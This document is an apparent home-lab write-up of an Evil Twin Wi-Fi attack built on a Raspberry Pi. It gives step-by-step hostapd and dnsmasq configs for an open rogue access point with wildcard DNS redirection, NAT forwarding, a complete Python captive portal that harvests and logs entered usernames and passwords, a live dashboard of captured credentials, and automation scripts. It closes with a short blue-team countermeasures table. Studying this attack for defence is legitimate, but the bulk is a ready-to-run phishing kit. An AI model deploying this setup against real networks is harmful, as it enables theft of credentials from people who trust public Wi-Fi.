**This project was built and tested exclusively on hardware and networks I own.**
The Evil Twin attack is documented here for educational and defensive security
research purposes only. Unauthorized interception of network traffic, capturing
credentials from devices you do not own, or deploying this against any network
without explicit written permission is illegal and unethical.

**Test environment:** Isolated home lab using only my own Raspberry Pi, router,
and personal test devices (phone/laptop).

---

## Project Objectives

- Understand how Wi-Fi client association and roaming works
- Learn DHCP, DNS, and captive portal interception techniques
- Build a real-time monitoring dashboard for captured data
- Document the complete attack chain for blue team awareness
- Create a foundation for further red/blue team exploration

---

## Hardware & Software Stack

| Component | Details |
|-----------|---------|
| **Device** | Raspberry Pi 3 Model B |
| **SoC** | Broadcom BCM2837 (Quad-core Cortex-A53) |
| **RAM** | 1GB LPDDR2 |
| **Internal Wi-Fi** | Broadcom BCM43438 2.4GHz 802.11n (wlan0) |
| **Ethernet** | 10/100 Mbps (eth0) |
| **OS** | Raspberry Pi OS 64-bit (Bookworm, Debian 12 based) |
| **Kernel** | Linux 6.6 |
| **Default Username** | bezuidenhout (with sudo privileges) |
| **Key Software** | hostapd 2.10, dnsmasq 2.89, Python 3.11, Flask 2.3 |

---

## Network Architecture
+--------------------------+
| Home Router |
| 192.168.222.1/24 |
| DHCP Server |
+------------+-------------+
|
| Ethernet Cable
| (Management + Internet Uplink)
|
+------------+-------------+
| Raspberry Pi 3 B |
| Raspberry Pi OS 64bit |
| |
| eth0: 192.168.222.30/24 |
| wlan0: 192.168.0.1/24 |
+------------+-------------+
|
| Wi-Fi 2.4GHz (Evil Twin AP)
| SSID: TestWiFi_Free
| Open Network
|
+------------+-------------+
| Target Test Device |
| (Phone / Laptop) |
| DHCP: 192.168.0.x |
+--------------------------+

text

### Interface Assignments

| Interface | IP Address | Netmask | Gateway | Role |
|-----------|------------|---------|---------|------|
| eth0 | 192.168.222.30 | 255.255.255.0 | 192.168.222.1 | Management & Internet |
| wlan0 | 192.168.0.1 | 255.255.255.0 | Self | Evil Twin AP Gateway |

---

##  Attack Chain Overview

Step 1: Attacker creates rogue AP broadcasting open "TestWiFi_Free"
Step 2: Victim device connects (auto-connect or manual)
Step 3: DHCP server assigns IP in 192.168.0.0/24 range
Step 4: All DNS requests intercepted, resolved to 192.168.0.1
Step 5: HTTP requests redirected to captive portal login page
Step 6: Victim enters credentials → captured to log file
Step 7: Real-time monitoring dashboard displays captures
Step 8: Attacker can optionally forward traffic to internet (NAT)

text

---

## Detailed Setup Instructions

### Phase 1: Operating System Preparation

**1.1 Flash Raspberry Pi OS**
- Downloaded Raspberry Pi OS 64-bit (Bookworm) from raspberrypi.com
- Flashed to 32GB MicroSD card using Raspberry Pi Imager
- Configured hostname: `pitest`, username: `bezuidenhout`, enabled SSH

**1.2 First Boot & System Update**
```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y hostapd dnsmasq net-tools iptables-persistent git
1.3 Install Python Dependencies

bash
# Raspberry Pi OS uses system Flask package — no pip required
sudo apt install -y python3-flask
Phase 2: Network Configuration
2.1 Set Static IP on Ethernet (Management Interface)

Check current network setup:

bash
ip link show
ip route | grep default
Using NetworkManager (default on Pi OS Bookworm):

bash
# Create static connection for eth0
sudo nmcli con add type ethernet ifname eth0 con-name static-eth0 \
  ip4 192.168.222.30/24 gw4 192.168.222.1

# Set DNS servers
sudo nmcli con mod static-eth0 ipv4.dns "8.8.8.8 1.1.1.1"

# Activate
sudo nmcli con up static-eth0
Verify:

bash
ip addr show eth0 | grep inet
# Output: inet 192.168.222.30/24
2.2 Wi-Fi Regulatory Domain Fix

Raspberry Pi OS enforces wireless regulatory rules. If the Wi-Fi is blocked:

bash
# Check rfkill status
rfkill list

# Unblock if soft-blocked
sudo rfkill unblock all

# Set regulatory domain (South Africa = ZA, change as needed)
sudo iw reg set ZA
iw reg get
Phase 3: Access Point Setup
3.1 hostapd Configuration

Create /etc/hostapd/hostapd.conf:

text
interface=wlan0
driver=nl80211
ssid=TestWiFi_Free
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
Options explained:

Setting	Meaning
interface=wlan0	Built-in Pi Wi-Fi chip
driver=nl80211	Modern Linux wireless driver
hw_mode=g	2.4GHz 802.11g mode
channel=6	Avoids interference with common channels 1, 11
auth_algs=1	Open authentication (no WPA/WPA2)
3.2 dnsmasq Configuration (DHCP + DNS)

Move default config and create new:

bash
sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
sudo nano /etc/dnsmasq.conf
Content:

text
interface=wlan0
dhcp-range=192.168.0.10,192.168.0.200,255.255.255.0,12h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
address=/#/192.168.0.1
log-queries
log-dhcp
Critical line: address=/#/192.168.0.1 — wildcard DNS record that
resolves ALL domain names to the Pi's IP. This is what forces the captive
portal redirect regardless of what URL the victim types.

3.3 Enable IP Forwarding & NAT

Allow AP clients to reach the internet through eth0:

bash
# Enable IP forwarding
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Configure NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Make persistent across reboots
sudo netfilter-persistent save
Phase 4: Captive Portal (Credential Harvester)
4.1 Why Python Instead of Apache

Initial attempts with Apache2 failed due to:

Port binding timing issues (Apache starts before wlan0 has IP)

Complex virtual host configuration

Heavy resource usage on Pi 3

Solution: Lightweight Python HTTP server that binds to 0.0.0.0:80.

4.2 Create /root/captive-portal.py

python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime

HTML = """
<!DOCTYPE html>
<html>
<head>
<title>Sign in to Wi-Fi</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
    font-family: -apple-system, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0;
}
.box {
    background: white; padding: 40px; border-radius: 10px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
    text-align: center; width: 90%; max-width: 350px;
}
h2 { color: #333; }
p { color: #666; font-size: 14px; margin-bottom: 25px; }
input[type="text"], input[type="password"] {
    width: 100%; padding: 12px; margin: 8px 0;
    border: 1px solid #ddd; border-radius: 5px;
    font-size: 16px; box-sizing: border-box;
}
input[type="submit"] {
    width: 100%; padding: 12px; background: #4CAF50;
    color: white; border: none; border-radius: 5px;
    font-size: 16px; cursor: pointer; margin-top: 10px;
}
</style>
</head>
<body>
<div class="box">
<h2>Sign in to Wi-Fi</h2>
<p>Enter your credentials to access the internet</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<input type="submit" value="Sign In">
</form>
</div>
</body>
</html>
"""

SUCCESS = """
<!DOCTYPE html>
<html>
<head><title>Connected</title>
<style>
body { font-family: sans-serif; background: #43e97b; text-align: center; padding-top: 50px; }
h2 { color: #333; }
</style>
</head>
<body>
<h2>Connected!</h2>
<p>You may now access the internet.</p>
</body>
</html>
"""

class Portal(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = parse_qs(self.rfile.read(length).decode())
        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]
        client_ip = self.client_address[0]

        log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] IP={client_ip} User={username} Pass={password}\n"
        with open('/var/www/html/creds.txt', 'a') as f:
            f.write(log)
        print(f"[+] Credentials captured: {username}:{password}")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(SUCCESS.encode())

print("[*] Captive Portal running on http://0.0.0.0:80")
HTTPServer(('0.0.0.0', 80), Portal).serve_forever()

4.3 Initialize Credentials Log

bash
sudo mkdir -p /var/www/html
sudo touch /var/www/html/creds.txt
sudo chmod 666 /var/www/html/creds.txt


Phase 5: Monitoring Dashboard

5.1 Create /root/evil-monitor/app.py

Flask-based web dashboard displaying real-time attack telemetry:

Connected Clients — parsed from ARP table

DHCP Leases — from dnsmasq.leases file

Captured Credentials — from captive portal log

DNS Queries — from dnsmasq journal

Interface Stats — wlan0 traffic counters

Dashboard accessible at: http://192.168.222.30:8080

5.2 Create systemd Service

/etc/systemd/system/evil-monitor.service:

text
[Unit]
Description=Evil Twin Web Monitor
After=network.target

[Service]
User=root
WorkingDirectory=/root/evil-monitor
ExecStart=/usr/bin/python3 /root/evil-monitor/app.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
bash
sudo systemctl daemon-reload
sudo systemctl enable evil-monitor
sudo systemctl start evil-monitor
Phase 6: Startup & Shutdown Automation
6.1 Startup Script: /root/start-evil-twin.sh

bash
#!/bin/bash
# Evil Twin AP Startup Script
# Raspberry Pi OS 64-bit

echo "[*] Unblocking WiFi..."
sudo rfkill unblock all

echo "[*] Killing conflicting processes..."
sudo killall wpa_supplicant 2>/dev/null
sudo systemctl stop NetworkManager 2>/dev/null
sleep 2

echo "[*] Setting up wlan0..."
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip addr add 192.168.0.1/24 dev wlan0
sudo ip link set wlan0 up

echo "[*] Starting dnsmasq..."
sudo systemctl restart dnsmasq

echo "[*] Starting hostapd..."
sudo hostapd /etc/hostapd/hostapd.conf -B

echo "[*] Starting Captive Portal on port 80..."
sudo python3 /root/captive-portal.py &

echo "[*] Starting web monitor..."
sudo systemctl restart evil-monitor

echo ""
echo "[+] Evil Twin AP started on wlan0 (192.168.0.1/24)"
echo "[+] AP SSID: TestWiFi_Free"
echo "[+] Captive portal: http://192.168.0.1"
echo "[+] Monitor dashboard: http://192.168.222.30:8080"
6.2 Shutdown Script: /root/stop-evil-twin.sh

bash
#!/bin/bash
# Evil Twin AP Shutdown Script

echo "[*] Stopping Evil Twin..."
sudo killall hostapd 2>/dev/null
sudo killall python3 2>/dev/null
sudo systemctl stop dnsmasq
sudo systemctl stop evil-monitor
sudo ip addr del 192.168.0.1/24 dev wlan0 2>/dev/null

echo "[*] Restarting NetworkManager..."
sudo systemctl start NetworkManager

echo "[+] Evil Twin stopped, normal Wi-Fi restored"
bash
chmod +x /root/start-evil-twin.sh /root/stop-evil-twin.sh

Testing Results

Test 1: AP Broadcasting
Method: Scanned Wi-Fi networks from Android phone and Windows laptop

Result: "TestWiFi_Free" visible as open/unsecured network

Signal strength: -35dBm at 2 meters (strong)

Test 2: DHCP Assignment
Method: Connected test phone to AP

Result: Phone received IP 192.168.0.41 with gateway 192.168.0.1

Lease visible in: /var/lib/misc/dnsmasq.leases

Test 3: DNS Redirection
Method: Opened browser, navigated to google.com, facebook.com, random URLs

Result: All requests resolved to 192.168.0.1, captive portal displayed

Mechanism: address=/#/192.168.0.1 in dnsmasq.conf

Test 4: Credential Capture
Method: Entered test credentials on captive portal

Input: Username: testuser, Password: TestPass123!

Result: Successfully logged to /var/www/html/creds.txt

Dashboard display: Instant update in Captured Credentials section

Test 5: Internet Passthrough
Method: After captive portal "sign-in", browsed to actual websites

Result: Traffic forwarded through eth0 via NAT — full internet access

Dashboard Sections Breakdown

Section	Data 	    	Source			            	Refresh		Description
System Header	    	System clock		        	5 seconds	Current timestamp
Connected Clients       arp -a			            	5 seconds	IP, MAC, hostname of connected devices
DHCP Leases		        /var/lib/misc/dnsmasq.leases	5 seconds	MAC, assigned IP, hostname, lease expiry
Captured Credentials	/var/www/html/creds.txt		    5 seconds	Timestamp, IP, username, password
DNS Queries		        journalctl -u dnsmasq	    	5 seconds	Last 15 DNS requests
Interface Stats		    ip addr show wlan0	        	5 seconds	RX/TX bytes, packets, errors

Troubleshooting Log
Issues encountered and solutions during the build:

#	Problem					                	Root Cause	                		    	Solution
1	rfkill: WLAN soft blocked			        Pi OS soft-blocks Wi-Fi by default	    	Added rfkill unblock all to startup script
2	NetworkManager/interfaces.d confusion		Tutorial assumed Kali, not Pi OS	    	Used nmcli for eth0, manual ip commands for wlan0
3	Apache2 "Cannot assign requested address"	Apache tried binding before wlan0 had IP	Replaced with Python HTTPServer that binds to 0.0.0.0
4	SyntaxError: bytes can only contain ASCII	Curly quotes in pasted Python code	    	Used cat > file << 'EOF' heredoc for clean file creation
5	Dashboard not showing credentials	       	Parser expected wrong log format	    	Updated parser to match IP=... User=... Pass=... format
6	status=217/USER in systemd		        	Service configured for kali user		    Changed to User=root and /root/ paths
7	Captive portal not starting		        	Missing from startup script		    	    Added python3 /root/captive-portal.py & to script


Blue Team Countermeasures
Understanding this attack informs these defensive strategies:

Layer		Countermeasure			Effectiveness
Network		802.1X / WPA3-Enterprise	Prevents rogue AP association entirely
Network		Wireless IDS (WIDS)		Detects unauthorized APs by BSSID/MAC
Endpoint	Certificate pinning		Prevents HTTPS downgrade attacks
Endpoint	Always-on VPN			Traffic encrypted even if AP compromised
User		Security awareness training	Users suspicious of unexpected captive portals
User		"Forget network" after use	Prevents auto-reconnect to rogue APs
Monitoring	MAC/BSSID correlation		Detects cloned APs with same SSID but different BSSID

 Complete File Inventory
text
/etc/
├── hostapd/
│   └── hostapd.conf                 # AP configuration
├── dnsmasq.conf                     # DHCP + DNS configuration
└── systemd/system/
    └── evil-monitor.service         # Dashboard auto-start service

/root/
├── start-evil-twin.sh               # Startup script
├── stop-evil-twin.sh                # Shutdown script
├── captive-portal.py                # Captive portal HTTP server
├── evil-twin-documentation.md       # This document
└── evil-monitor/
    └── app.py                       # Flask monitoring dashboard

/var/www/html/
└── creds.txt                        # Captured credentials log

/var/lib/misc/
└── dnsmasq.leases                   # DHCP lease database

 References & Resources
 
Raspberry Pi OS Documentation: https://www.raspberrypi.com/documentation/

hostapd Linux manual: https://w1.fi/hostapd/

dnsmasq manual: https://thekelleys.org.uk/dnsmasq/doc.html

Flask Documentation: https://flask.palletsprojects.com/

Wi-Fi Alliance Security: https://www.wi-fi.org/discover-wi-fi/security

OWASP Wireless Security: https://owasp.org/www-project-wireless-security/